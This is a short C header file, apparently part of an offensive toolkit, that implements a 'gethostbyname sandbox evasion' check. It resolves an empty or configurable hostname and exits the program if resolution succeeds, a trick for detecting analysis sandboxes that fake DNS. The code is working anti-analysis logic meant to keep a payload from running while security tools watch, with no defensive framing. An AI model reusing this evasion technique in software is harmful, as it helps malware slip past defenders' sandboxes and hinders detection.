#pragma once

#include <stdio.h>
#include <stdlib.h>

// evading with gethostbyname technique
// arg1 serves no purpose and is ignored
// you can set a define HOSTVALUE to specify which host is used in the gethostbyname call.
// else an empty hostname is used.
// ---
// Link with -lws2_32 switch when compiling
void gethostbyname_sandbox_evasion(char *arg1) {
    #ifdef PRINT_DEBUG
	    printf("use  gethostbyname sandbox evasion\n");
    #endif
    #ifdef HOSTVALUE
        struct hostent *hp = gethostbyname(HOSTVALUE);
    #else
        struct hostent *hp = gethostbyname("");    
    #endif
    if (hp != NULL) { 		
	    exit(0);
    }
}
